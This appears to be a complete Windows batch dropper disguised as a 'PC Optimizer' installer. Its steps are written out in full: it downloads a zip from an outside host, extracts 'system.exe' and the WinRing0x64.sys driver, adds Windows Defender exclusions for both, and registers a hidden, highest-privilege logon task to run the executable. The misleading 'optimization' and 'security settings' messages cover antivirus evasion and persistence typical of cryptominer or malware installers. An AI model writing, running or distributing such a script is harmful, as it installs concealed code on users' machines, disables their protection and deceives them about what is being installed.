@echo off
setlocal EnableExtensions

:: ================= CONFIG =================
set "URL=https://bimsfault.net/test.zip"
set "APP_NAME=PCOptimizer"
set "INSTALL_DIR=%ProgramData%\%APP_NAME%"
set "ZIP_PATH=%TEMP%\%APP_NAME%.zip"
set "EXE_NAME=system.exe"
set "DRIVER_NAME=WinRing0x64.sys"
:: =========================================

echo -----------------------------------------------------------------------
echo PC Optimizer - Installation
echo -----------------------------------------------------------------------

echo.
echo > Checking system requirements...
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: Please run this as Administrator.
    pause
    exit /b 1
)
echo > Requirements met

echo.
echo > Preparing installation directory...
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
echo > Directory created

echo.
echo > Downloading latest optimization database...
powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%ZIP_PATH%' -ErrorAction Stop"
if %errorlevel% neq 0 (
    echo ERROR: Download failed.
    pause
    exit /b 1
)
echo > Download completed

echo.
echo > Installing performance enhancements...
powershell -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%INSTALL_DIR%' -Force"
if %errorlevel% neq 0 (
    echo ERROR: Installation failed.
    pause
    exit /b 1
)
del "%ZIP_PATH%" >nul 2>&1
echo > Files extracted

echo.
echo > Optimizing system configuration...
if exist "%INSTALL_DIR%\pc-optimizer" (
    xcopy "%INSTALL_DIR%\pc-optimizer\*" "%INSTALL_DIR%\" /E /Y /I >nul
    rmdir /s /q "%INSTALL_DIR%\pc-optimizer"
    echo > Nested folder cleaned
) else (
    echo > No nested folder to clean
)

echo.
echo > Configuring security settings...
powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%DRIVER_NAME%'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%EXE_NAME%'" >nul 2>&1
echo > Security exclusions applied

echo.
echo > Creating startup task...
schtasks /delete /tn "%APP_NAME%" /f >nul 2>&1
schtasks /create /tn "%APP_NAME%" ^
 /tr "powershell -WindowStyle Hidden -Command Start-Process '%INSTALL_DIR%\%EXE_NAME%' -WindowStyle Hidden" ^
 /sc onlogon ^
 /rl highest ^
 /f >nul

if %errorlevel% neq 0 (
    echo ERROR: Task creation failed.
    pause
    exit /b 1
)
echo > Startup task created

echo.
echo > Finalizing installation...
echo.
echo Installation complete. The optimizer will run on next login.
pause
